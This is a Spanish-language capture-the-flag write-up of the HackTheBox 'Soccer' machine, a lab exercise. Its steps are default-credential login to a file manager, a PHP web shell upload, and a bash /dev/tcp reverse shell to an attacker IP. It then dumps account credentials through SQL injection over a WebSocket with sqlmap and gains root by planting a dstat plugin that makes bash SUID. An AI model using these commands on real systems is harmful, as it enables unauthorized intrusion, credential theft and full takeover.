---
layout: single
title: Soccer - HackTheBox
excerpt: " This CTF focuses on success through enumeration. "
date: 2023-06-20
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-soccer/soccer.png
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:  
  - mysql
  - ssh
  - suid
---

This CTF focuses on success through enumeration.

# Summary
- IP: 10.10.11.194
- Ports: 22,80,9091
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	- 22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
	- 80 -> nginx 1.18.0
	- 9091 -> xmltec-xmlmail?

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

``` bash
$sudo nmap -p22,80,9091 -sCV 10.10.116.216 -oN targeted
``` 

- Reconocimiento de directorios con gobuster:

```bash
$gobuster dir -u soccer.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php
```

- Encontramos el directorio "/tiny", accedemos y nos encontramos con un login de "Tiny File Manager", buscamos en google las credenciales por defecto de este recurso y probamos.

- Accedemos como admin, analizamos la web, nos permite subida de archivos en el directorio "/uploads", subimos un PHP con una reverse shell y accedemos:

```
http://soccer.htb/tiny/uploads/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.85/443%200%3E%261%22
```

- Como el usuario www-data buscamos recursos para escalar privilegios:
- Recordamos que el puerto 9091 estaba aabierto, sospechamos de un websocket, lo comprobamos:

```bash
websocat ws://soccer.htb:9091 -v
```

- Confirmado ya que se trata de un Web Socket, buscamos vulnerabilidades para la misma, encontramos este artículo [Automating Blind SQL injection over WebSocket | Rayhan0x01’s Blog](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

- Ejecutamos la script de python para redireccionar los datos de la ws y poder acceder a estos como localhost para realizar un ataque de SQL Injection:
- Cambiamos los campos "ws-server" por el puerto 9091 y "data" por "id"

```bash
$python3 exploit.py
```

- Ahora atacamos con sqlmap. primero en búsqueda de los nombres de las bases de datos:

```bash
sqlmap -u "http://127.0.0.1:8081/?id=1" --dbs
```

- Ahora buscamos las tablas que hay en la BD "soccer_db":

```bash
 sqlmap -u "http://127.0.0.1:8081/?id=1" -D soccer_db --tables
```

- Enumeramos las columnas de esta tabla:

```bash
 sqlmap -u "http://127.0.0.1:8081/?id=1" -D soccer_db -T accounts --columns
```

- Encontramos las columnas username y password, las dumpeamos:

```bash
sqlmap -u "http://127.0.0.1:8081/?id=1" -D soccer_db -T accounts -C username,password -dump
```

- Obtenemos la contraseña del usuario "player" accedemos por SSH:

```bash
$ssh player@10.10.103.124
```

- Obtenemos la primera flag.

# Escalando privilegios:


- Buscamos permisos SUID:

```bash
$ find / -perm -4000 2>/dev/null
```

- Nos encontramos con "doas", buscamos todos los archivos doas que hayan:

```bash
$ find -name doas 2>/dev/null l grep doas
```

- Nos encontramos un "doas.conf", lo leemos, nos dice que un binario dstat se puede ejecutar como root sin contraseña:

```bash
/usr/bin/dstat
$ doas -u root /usr/bin/dstat
```

- Tenemos capacidad de escritura en la ruta share/dstat que es en donde se guardan los plugins:
```bash
$ ls -la /usr/local/share/dstat
```

- Nos creamos un plugin .py que otorgue permisos SUID a la bash y lo ejecutamos como root:
```bash
player@soccer:/usr/local/share/dstat$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --privesc &>/dev/null
bash -P
```

- Ya somos ROOT y obtenemos la flag.



# Holaaaaaaaaaaaaaaa


<p style="text-align: center;">
<img src="/blog/_posts/images/soccer/DedSec_logo.webp">
</p>
